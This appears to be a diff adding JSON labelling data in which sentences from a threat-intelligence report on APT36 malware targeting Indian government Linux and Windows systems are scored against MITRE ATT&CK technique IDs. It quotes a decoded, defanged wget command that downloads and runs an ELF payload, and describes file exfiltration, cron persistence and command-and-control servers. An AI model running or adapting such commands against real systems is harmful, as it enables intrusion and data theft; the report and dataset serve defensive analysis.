+        "sentence": "New Python-Based Cyber Espionage Utilities Targeting Linux During our analysis, we also discovered new Python-based ELF binaries used by APT36 for the purpose of cyber espionage.",
+        "score": 0.4083
+      },
+      {
+        "sentence": "These binaries target the Linux environment in the Indian government organizations and are named to seem like legitimate Linux system services.",
+        "score": 0.713
+      },
+      {
+        "sentence": "GLOBSHELL - Custom-built File exfiltration Linux utility The espionage tool under analysis includes this metadata: - MD5 hash: 3c3c9303ae33f3bae2e139dbb1db838e - Filename: rcu-tasks-kthread This ELF binary was compiled using PyInstaller.",
+        "score": 0.3215
+      },
+      {
+        "sentence": "We extracted the decompiled Python code to understand its functionality.",
+        "score": 0.3215
+      },
+      {
+        "sentence": "The image below shows the decompiled code.",
+        "score": 0.3198
+      },
+      {
+        "sentence": "Figure 10: The decompiled code of Python-based cyber espionage tool type 1.",
+        "score": 0.3526
+      },
+      {
+        "sentence": "Along with the ZIP file, the machine's username, hostname, and the current timestamp are sent.",
+        "score": 0.3229
+      },
+      {
+        "sentence": "We found another ELF binary called mm-precpu-wq with the same functionality as the ELF binary discussed above.",
+        "score": 0.4589
+      },
+      {
+        "sentence": "Figure 11: The decompiled code Python-based cyber espionage tool type 2.",
+        "score": 0.3381
+      },
+      {
+        "sentence": "Then, the code checks if they match any value in the predefined list mentioned earlier. - If and when it finds a match, the code archives the ~/.mozilla/firefox directory content into the /dev/shm/firefox.zip ZIP archive. - Uploads the ZIP archive to hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request.",
+        "score": 0.321
+      },
+      {
+        "sentence": "Reasons for New Linux-Based Attack Vectors Why is APT36 suddenly adding new attack vectors for the Linux environment? - Historic and widespread usage of Linux in the Indian government sector: Linux-based operating systems are widely used in the Indian government sector.",
+        "score": 0.346
+      },
+      {
+        "sentence": "The Debian-based operating system, BOSS (Bharat Online Software Solution), developed by CDAC is used across various state ministries and even the Indian defense forces.",
+        "score": 0.3038
+      },
+      {
+        "sentence": "For more details about the usage of Linux Boss in India, visit the Ministry of Electronics & Information Technology. - Expanding into government-related verticals: The recent announcement by the Indian government introduces Maya OS, a Debian Linux-based operating system that will replace Microsoft Windows OS across government and defense sectors.",
+        "score": 0.3949
+      },
+      {
+        "sentence": "Threat Attribution We attribute these new Windows and Linux-based attacks to APT36 because their method of serving decoy PDF files, the metadata and their Linux commands are almost identical to previous attacks, which are known and linked to APT36.",
+        "score": 0.4024
+      },
+      {
+        "sentence": "Decoy PDF files The decoy PDF file which is dropped in the same directory as the malicious DLL on the victim's machine by ElizaRAT.",
+        "score": 0.5096
+      },
+      {
+        "sentence": "The metadata of this PDF file indicated the author as \"Apolo Jones\" and the PDF file itself was generated with Microsoft Office Word.",
+        "score": 0.3642
+      },
+      {
+        "sentence": "In addition to this, the decoy PDF files downloaded from the attacker-controlled servers in the campaign targeting the Linux platform share the same metadata as well.",
+        "score": 0.3921
+      },
+      {
+        "sentence": "Linux commands While the attack vector used to distribute the Linux payload is entirely new in this campaign, the Linux commands and file paths used in the desktop entry files share similarities with the previous APT36 campaign used to distribute Linux payloads.",
+        "score": 0.451
+      },
+      {
+        "sentence": "In March 2023, APT36 used a Python-compiled ELF binary to target the Linux environment in the Indian government sector.",
+        "score": 0.3667
+      },
+      {
+        "sentence": "By comparing the Linux commands used in the decompiled Python code in March 2023 and the Linux commands used in the latest desktop entry files (in August 2023), we can see a clear similarity.",
+        "score": 0.457
+      },
+      {
+        "sentence": "Here is a list of similarities between both cases: - A hidden directory path structure is created in the location: ~/.local/share . - A short shell script responsible for rebooting the machine and executing the Linux payload is written to /dev/shm/ . - The same crontab command is executed. - The shell script is deleted. - The sequence of commands is similar.",
+        "score": 0.4324
+      },
+      {
+        "sentence": "Threat Actor Infrastructure In the APT36 attacks observed since April 2023, the threat actor has taken extensive measures to conceal any connection to Pakistan by making it seem that the infrastructure is controlled by a threat actor in India.",
+        "score": 0.4294
+      },
+      {
+        "sentence": "We assess, with a high-confidence, that this is not a coincidence but rather an intentional deception tactic used by APT36 to avoid the attacks from being attributed to Pakistan.",
+        "score": 0.4031
+      },
+      {
+        "sentence": "This infrastructure was involved in the attacks distributing malicious Linux desktop entry files discussed earlier.",
+        "score": 0.452
+      },
+      {
+        "sentence": "For most of the domains, the threat actor took sufficient measures to ensure the registrant country is India (IN).",
+        "score": 0.4191
+      },
+      {
+        "sentence": "However, for one of the domains, admindesk[.]in, we can see the registrant country is PK (Pakistan).",
+        "score": 0.3276
+      },
+      {
+        "sentence": "Email Associated with Malicious Google Drive Links ElizaRAT is distributed using malicious Google Drive links.",
+        "score": 0.3517
+      },
+      {
+        "sentence": "The email address and owner name associated with the Google Drive link was: - Email address: [email protected] - Owner namer: \"Nand Kishore\" Because “Nand Kishore” is a common name in India, the fake owner was added to implicate a threat actor from India, not Pakistan - where APT36 originates.",
+        "score": 0.4586
+      },
+      {
+        "sentence": "Attacker-Controlled Server IP Addresses In a few instances, threat actors distributed malicious Linux desktop entry files where the embedded payloads were hosted on servers located in India.",
+        "score": 0.4064
+      },
+      {
+        "sentence": "Here is a list of the IP addresses of four servers hosting the malicious Linux payloads: - 103.2.232[.]82 - 64.227.133[.]222 - 64.227.138[.]127 - 134.209.159[.]9 Top Level Domain (TLDs) of Malicious Domains In all of the attacks we reviewed for this blog, the TLD was always set to .in - corresponding with the country of India.",
+        "score": 0.3231
+      },
+      {
+        "sentence": "Another tactic used by APT36 in a few cases is to disguise bad URLs as official Indian government-related web addresses.",
+        "score": 0.5073
+      },
+      {
+        "sentence": "Conclusion Our research team is actively monitoring the C2 infrastructure of APT36, which is used to register new domains that are used in attacks targeting the Linux environment.",
+        "score": 0.32
+      },
+      {
+        "sentence": "We have included a comprehensive list of indicators of compromise (IOCs) at the end of this blog and we urge the research community to update their detection.",
+        "score": 0.3252
+      },
+      {
+        "sentence": "APT36’s introduction of new file formats, new attack vectors, and a new backdoor to the arsenal suggests that they are actively updating their tactics, techniques, and procedures (TTPs).",
+        "score": 0.4167
+      },
+      {
+        "sentence": "Zscaler Coverage Zscaler's multilayered cloud security platform detects indicators at various levels. - Win32.RAT.ElizaRAT - Win64.RAT.ElizaRAT - Linux.Payload.GLOBSHELL - Linux.Payload.PYSHELLFOX - Linux.Backdoor.Mythic The image below shows the sandbox detection for the new Windows RAT (ElizaRAT) used in the attack.",
+        "score": 0.3947
+      }
+    ],
+    "T1564.001": [
+      {
+        "sentence": "ElizaRAT is distributed as .NET binaries sent inside password-protected archive files hosted on Google Drive links.",
+        "score": 0.4358
+      },
+      {
+        "sentence": "To the best of our knowledge, we believe this is the first time APT36 has weaponized the CPL file format. - The binaries are large in size - ranging from 4MB to 16MB. - The Costura .NET framework was used to embed the essential .NET assemblies inside the main malware which resulted in the inflation of binary sizes. - The Telegram API was used for C2 communication.",
+        "score": 0.3793
+      },
+      {
+        "sentence": "For this technical analysis, we use the following file metadata: - MD5 hash: fc99daa2e1b47bae4be51e5e59aef1f0 - Filename: AgendaMeeting.cpl Since this Windows RAT arrives on the endpoint in the form of a Control Panel applet, the first method called upon execution is CplApplet().",
+        "score": 0.3391
+      },
+      {
+        "sentence": "In the following sections, we dive deeper into some of these operations.",
+        "score": 0.3027
+      },
+      {
+        "sentence": "The code below shows that logging is done at the local and remote level. | // remote logging in Telegram bo await Communication.send_message(\"Username Created with name : \" + TextSource.Settings._username); // local logging on the infected endpoint File.AppendAllText(TextSource.Settings.log_p, \"username created local\\n\"); | Unique Identifier Generation A UUID and username are generated for each infected machine so that the threat actor can uniquely identify the victim.",
+        "score": 0.3535
+      },
+      {
+        "sentence": "The username is the UUID without the \".cookie\" extension.",
+        "score": 0.3107
+      },
+      {
+        "sentence": "The image below shows the relevant code used to generate these values.",
+        "score": 0.3201
+      },
+      {
+        "sentence": "The following C2 commands are supported by the bot: | C2 COMMAND | FUNCTIONALITY | |---|---| | /dir | Fetches the list of files in the specified directory. | | /upload | Uploads the specified file from the victim’s machine. | | /getprocess | Gets the list of processes running on the victim’s machine.",
+        "score": 0.3535
+      },
+      {
+        "sentence": "The list is returned in a file with the name getproc.dll . | | /run | Executes the specified program on the victim’s machine. | | /delete | Deletes the specified file. | | /end | Kills the specified processes on the victim’s machine. | | /online | Checks whether the infected machine is online. | | /identity | Connects to the specified website from the victim’s machine and sends a response to the threat actor.",
+        "score": 0.3411
+      },
+      {
+        "sentence": "The image below shows the code used to create this shortcut file.",
+        "score": 0.3998
+      },
+      {
+        "sentence": "The name of the shortcut file is fetched from the \"orig_name\" setting defined in the config.",
+        "score": 0.4769
+      },
+      {
+        "sentence": "In this case, the shortcut file is called TextSource.lnk.",
+        "score": 0.405
+      },
+      {
+        "sentence": "Figure 3: The buildforts() method used to create a Windows shortcut file in the Startup directory for persistence.",
+        "score": 0.4429
+      },
+      {
+        "sentence": "The description of this shortcut file is set to \"Text Editing APP for Windows\" to disguise it as a text editing application, making it seem innocuous.",
+        "score": 0.519
+      },
+      {
+        "sentence": "Displaying Decoy Content The method dosome() defined in the Program class is responsible for displaying the decoy PDF file to the user.",
+        "score": 0.4448
+      },
+      {
+        "sentence": "This decoy file is present inside the resources section of the .NET binary.",
+        "score": 0.4642
+      },
+      {
+        "sentence": "The image below shows the decoy file.",
+        "score": 0.447
+      },
+      {
+        "sentence": "It is only used to distract the victim and make it appear that an error occurred when opening the file.",
+        "score": 0.4059
+      },
+      {
+        "sentence": "Figure 4: Decoy PDF file displayed to the user.",
+        "score": 0.4569
+      },
+      {
+        "sentence": "Malicious Linux Desktop Entry Files as New Attack Vectors The utilization of Linux desktop entry files by APT36 as an attack vector has never been documented before.",
+        "score": 0.3945
+      },
+      {
+        "sentence": "We also noticed that the same phishing website was using the hxxps://email9ov[.]in/VISIT_OF_MEDICAL URL to redirect visitors to the hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.zip URL.",
+        "score": 0.3216
+      },
+      {
+        "sentence": "From here, a visitor would download a ZIP archive containing a maliciously crafted Linux desktop entry file.",
+        "score": 0.3583
+      },
+      {
+        "sentence": "The base64-encoded command present inside the desktop entry file decodes to: | /usr/bin/wget 'hxxp://103.2.232[.]82:8081/Tri-Service-Exercise/Delegation_Saudi_Arabia.pdf' -O /tmp/Delegation_Saudi_Arabia.pdf; /usr/bin/wget 'hxxp://103.2.232[.]82:8081/ISEPC-12-2023-Agenda-for-meeting/185' -O /tmp/185.elf; cd /tmp; chmod +x 185.elf;libreoffice /tmp/Delegation_Saudi_Arabia.pdf | ./185 | The command decoded above performs the following actions: 1.",
+        "score": 0.4531
+      },
+      {
+        "sentence": "Downloads the decoy PDF and saves it in the /tmp directory with the filename: Delegation_Saudi_Arabia.pdf .",
+        "score": 0.4361
+      },
+      {
+        "sentence": "Downloads the Linux payload and saves it in the /tmp directory with the filename: 185.elf .",
+        "score": 0.3529
+      },
+      {
+        "sentence": "Marks the Linux binary as executable.",
+        "score": 0.3748
+      },
+      {
+        "sentence": "Uses LibreOffice to open and display the decoy PDF file.",
+        "score": 0.425
+      },
+      {
+        "sentence": "The content inside the decoy PDF file is displayed in the image below.",
+        "score": 0.4368
+      },
+      {
+        "sentence": "Figure 5: Decoy PDF displayed to the user.",
+        "score": 0.4495
+      },
+      {
+        "sentence": "In August, we noted a significant development where few of these domains served as the hosting platform for decoy PDF files.",
+        "score": 0.3119
+      },
+      {
+        "sentence": "These PDFs were linked within the malicious Linux desktop entry files, which the threat actor distributed enclosed in zip archives.",
+        "score": 0.5044
+      },
+      {
+        "sentence": "Here are some technical details about this case: - ZIP archive MD5 hash: 36b19ca8737c63b9c9a3365ff4968ef5 - ZIP filename: Meeting_agenda.zip - Desktop entry file MD5 hash: 65167974b397493fce320005916a13e9 - Desktop entry filename: approved_copy.desktop Desktop entry file analysis The first anomaly we observed was the large size of the Linux desktop entry file.",
+        "score": 0.4886
+      },
+      {
+        "sentence": "A size larger than 1 MB for a Linux desktop entry file is rare.",
+        "score": 0.4904
+      },
+      {
+        "sentence": "Reviewing the file revealed that the threat actor inflated the size of the file by adding more than a million \"#\" characters.",
+        "score": 0.4223
+      },
+      {
+        "sentence": "The image below shows the extra characters added to the inflated Linux desktop entry file.",
+        "score": 0.5098
+      },
+      {
+        "sentence": "Figure 6: The inflated Linux desktop entry file.",
+        "score": 0.4703
+      },
+      {
+        "sentence": "This decoy file contains an error message to distract the user.",
+        "score": 0.4995
+      },
+      {
+        "sentence": "Figure 7 shows that the icon of this desktop file is set to application-pdf which is done to disguise the malware as an innocuous file. - Creates a hidden directory path called, local/share, in the user's home directory. - Downloads the Linux payload from the URL 64.227.133[.]222/zswap-xbusd using wget.",
+        "score": 0.6609
+      },
+      {
+        "sentence": "Saves it as zswap-xbusd in the previously created hidden directory. - Writes a short shell script to the file /dev/shm/myc.txt.",
+        "score": 0.678
+      },
+      {
+        "sentence": "The shell script reboots the machine and then launches the Linux payload. - Sets up a cron job under the current username to run the contents of the /dev/shm/myc.txt script. - Deletes the shell script. - Executes the Linux payload.",
+        "score": 0.3488
+      },
+      {
+        "sentence": "Figure 7: The icon of the desktop configuration file is set to PDF to make it more convincing.",
+        "score": 0.5019
+      },
+      {
+        "sentence": "The image below shows a decoy PDF file displaying an error message stating “Failed to load the PDF document”.",
+        "score": 0.3803
+      },
+      {
+        "sentence": "This is used to distract the user while malicious activities occur in the background.",
+        "score": 0.3877
+      },
+      {
+        "sentence": "Figure 8: The decoy PDF file displayed to the user.",
+        "score": 0.4519
+      },
+      {
+        "sentence": "In this case, the Linux desktop entry file retrieves the malicious Linux payloads from the servers at: - 64.227.138[.]127 - 134.209.159[.]9 The two files retrieved are cleverly named to disguise themselves as legitimate software utilities.",
+        "score": 0.4081
+      },
+      {
+        "sentence": "Here is the metadata of Linux payloads: - MD5 hash: 98279047a7db080129e5ec84533822ef - Filename: pickle-help - MD5 hash: 248d4e6bb0f32afd7a1cfb975910235a - Filename: ziputils-help A quick technical analysis determined these Linux payloads as Mythic Poseidon binaries.",
+        "score": 0.3436
+      },
+      {
+        "sentence": "Since Mythic is an open-source framework that is well-documented on GitHub, we will not explore its technical details in this blog.",
+        "score": 0.3098
+      },
+      {
+        "sentence": "The corresponding C2 servers extracted from each malicious Linux payload are listed below. | C2 IP ADDRESS | PORT | |---|---| | 108.61.163[.]195 | 7443 | | 64.176.40[.]100 | 7443 | The C2 panel for Mythic Poseidon can be accessed by visiting the URI path /new/login on the server running at port 7443.",
+        "score": 0.3184
+      },
+      {
+        "sentence": "New Python-Based Cyber Espionage Utilities Targeting Linux During our analysis, we also discovered new Python-based ELF binaries used by APT36 for the purpose of cyber espionage.",
+        "score": 0.3141
+      },
+      {
+        "sentence": "GLOBSHELL - Custom-built File exfiltration Linux utility The espionage tool under analysis includes this metadata: - MD5 hash: 3c3c9303ae33f3bae2e139dbb1db838e - Filename: rcu-tasks-kthread This ELF binary was compiled using PyInstaller.",
+        "score": 0.4092
+      },
+      {
+        "sentence": "We extracted the decompiled Python code to understand its functionality.",
+        "score": 0.3216
+      },
+      {
+        "sentence": "The image below shows the decompiled code.",
+        "score": 0.3409
+      },
+      {
+        "sentence": "Figure 10: The decompiled code of Python-based cyber espionage tool type 1.",
+        "score": 0.3639
+      },
+      {
+        "sentence": "These are the key operations performed by this script: - The script contains a predefined list of file extensions which are scanned for in the /media directory recursively.",
+        "score": 0.3709
+      },
+      {
+        "sentence": "The list of file extensions includes various types like image files, MS Office files, LibreOffice, and PDF. - Once the list of files is built, it copies the files to a hidden directory in the path: ~/.config/bossconfig/usnconfig/ - The content inside this directory is archived into a ZIP file called usnconfig.zip . - Data is exfiltrated to the URL hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request.",
+        "score": 0.5837
+      },
+      {
+        "sentence": "Along with the ZIP file, the machine's username, hostname, and the current timestamp are sent.",
+        "score": 0.3197
+      },
+      {
+        "sentence": "We found another ELF binary called mm-precpu-wq with the same functionality as the ELF binary discussed above.",
+        "score": 0.3061
+      },
+      {
+        "sentence": "However, this binary included a more in-depth predefined list of file extensions and file paths which it scans to exfiltrate files.",
+        "score": 0.4224
+      },
+      {
+        "sentence": "Figure 11: The decompiled code Python-based cyber espionage tool type 2.",
+        "score": 0.3649
+      },
+      {
+        "sentence": "This JSON data has details about the windows and tabs in the current live Firefox session. - Iterates over every tab in every Firefox window, extracting the title and the URL from each tab.",
+        "score": 0.3107
+      },
+      {
+        "sentence": "Then, the code checks if they match any value in the predefined list mentioned earlier. - If and when it finds a match, the code archives the ~/.mozilla/firefox directory content into the /dev/shm/firefox.zip ZIP archive. - Uploads the ZIP archive to hxxp://baseuploads[.]com/myf/test.php in an HTTP POST request.",
+        "score": 0.3958
+      },
+      {
+        "sentence": "In addition to uploading the data, the code also uploads the username, hostname, and current timestamp.",
+        "score": 0.3159
+      },
+      {
+        "sentence": "For more details about the usage of Linux Boss in India, visit the Ministry of Electronics & Information Technology. - Expanding into government-related verticals: The recent announcement by the Indian government introduces Maya OS, a Debian Linux-based operating system that will replace Microsoft Windows OS across government and defense sectors.",
+        "score": 0.3288
+      },
+      {
+        "sentence": "Decoy PDF files The decoy PDF file which is dropped in the same directory as the malicious DLL on the victim's machine by ElizaRAT.",
+        "score": 0.4826
+      },
+      {
+        "sentence": "The metadata of this PDF file indicated the author as \"Apolo Jones\" and the PDF file itself was generated with Microsoft Office Word.",
+        "score": 0.3021
+      },
+      {
+        "sentence": "In addition to this, the decoy PDF files downloaded from the attacker-controlled servers in the campaign targeting the Linux platform share the same metadata as well.",
+        "score": 0.3505
+      },
+      {
+        "sentence": "Linux commands While the attack vector used to distribute the Linux payload is entirely new in this campaign, the Linux commands and file paths used in the desktop entry files share similarities with the previous APT36 campaign used to distribute Linux payloads.",
+        "score": 0.4484
+      },
+      {
+        "sentence": "By comparing the Linux commands used in the decompiled Python code in March 2023 and the Linux commands used in the latest desktop entry files (in August 2023), we can see a clear similarity.",
+        "score": 0.5078
+      },
+      {
+        "sentence": "Here is a list of similarities between both cases: - A hidden directory path structure is created in the location: ~/.local/share . - A short shell script responsible for rebooting the machine and executing the Linux payload is written to /dev/shm/ . - The same crontab command is executed. - The shell script is deleted. - The sequence of commands is similar.",
+        "score": 0.5623
+      },
+      {
+        "sentence": "This infrastructure was involved in the attacks distributing malicious Linux desktop entry files discussed earlier.",
+        "score": 0.3451
+      },
+      {
+        "sentence": "Leveraging the Google Drive ID from the links, we gathered additional information about the owner of the Google Drive and the corresponding email address.",
+        "score": 0.3632
+      },
+      {
+        "sentence": "Figure 14: A Google Drive link details revealing owner information.",
+        "score": 0.4162
+      },
+      {
+        "sentence": "The email address and owner name associated with the Google Drive link was: - Email address: [email protected] - Owner namer: \"Nand Kishore\" Because “Nand Kishore” is a common name in India, the fake owner was added to implicate a threat actor from India, not Pakistan - where APT36 originates.",
+        "score": 0.3992
+      },
+      {
+        "sentence": "Attacker-Controlled Server IP Addresses In a few instances, threat actors distributed malicious Linux desktop entry files where the embedded payloads were hosted on servers located in India.",
+        "score": 0.3121
+      },
+      {
+        "sentence": "APT36’s introduction of new file formats, new attack vectors, and a new backdoor to the arsenal suggests that they are actively updating their tactics, techniques, and procedures (TTPs).",
+        "score": 0.3108
+      }
+    ]
+  }
+}
